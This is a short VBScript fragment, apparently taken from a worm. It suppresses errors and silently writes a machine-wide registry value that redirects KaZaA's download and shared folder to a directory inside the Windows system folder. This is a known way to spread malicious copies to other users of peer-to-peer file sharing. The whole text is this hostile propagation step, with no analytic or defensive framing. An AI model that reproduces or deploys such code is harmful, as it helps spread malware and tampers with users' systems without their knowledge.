   on error resume next
   set ws = CreateObject("wscript.shell")
   ws.regwrite "HKLM\Software\KaZaA\Transfer\DlDir0","c:\windows\system\ioana\"
